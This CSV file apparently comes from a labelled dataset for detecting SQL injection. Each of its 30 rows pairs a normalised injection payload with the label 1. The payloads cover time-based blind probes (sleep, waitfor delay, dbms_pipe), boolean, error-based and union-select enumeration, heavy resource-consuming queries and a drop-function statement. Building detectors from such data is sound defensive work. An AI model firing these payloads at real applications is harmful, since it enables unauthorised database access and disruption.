row_index,payload_norm,label,sqli_type_hint
2280,"1 where 3799 = 3799 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
2281,"-9672' ) ) as rupb where 8218 = 8218 or make_set ( 4954 = 1836,1836 ) --",1,
2282,"1%"" and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
2283,1'|| ( select 'cfff' where 4994 = 4994,1,
2284,1'+ ( select 'jtvq' where 8288 = 8288 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,
2285,1'+ ( select 'leok' where 4320 = 4320,1,
2286,"1'+ ( select 'uijv' where 7279 = 7279 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
2287,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( 1473 = 1473",1,
2288,1%' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( '%' = ',1,
2289,"-5579%"" ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""%"" = """,1,
2290,1 ) where 2734 = 2734 waitfor delay '0:0:5'--,1,
2291,1'|| ( select 'qgnz' where 6446 = 6446,1,
2292,1' ) ) as nhkp where 8030 = 8030,1,
2293,"1%"" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""%"" = """,1,
2294,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%' = '",1,
2295,1 ) ) as gygm where 4024 = 4024,1,
2296,"-2448%"" ) or 3038 = 3038",1,
2297,"1' ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'xzcr' = 'xzcr",1,
2298,1'+ ( select ijoh where 7145 = 7145 order by 1--,1,
2299,1 ) ) as sipp where 1999 = 1999 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,1,
2300,"1"" ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""ikaf"" like ""ikaf",1,
2301,if ( 1087 = 5839 ) select 1087 else drop function zzeh--,1,
2302,-8753 ) order by 1#,1,
2303,"1' ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( 'hfqz' = 'hfqz",1,
2304,"-1485' ) ) ) union all select 7661,7661,7661,7661,7661--",1,
2305,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ""%"" = """,1,
2306,1 ) as jqbp where 5407 = 5407 and 4595 = 4595#,1,
2307,"select dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 70 ) ||chr ( 106 ) ||chr ( 78 ) ,5 ) from dual--",1,
2308,"1%' ) union all select null,null,null,null,null,null,null,null,null#",1,
2309,1'+ ( select wpai where 3685 = 3685,1,
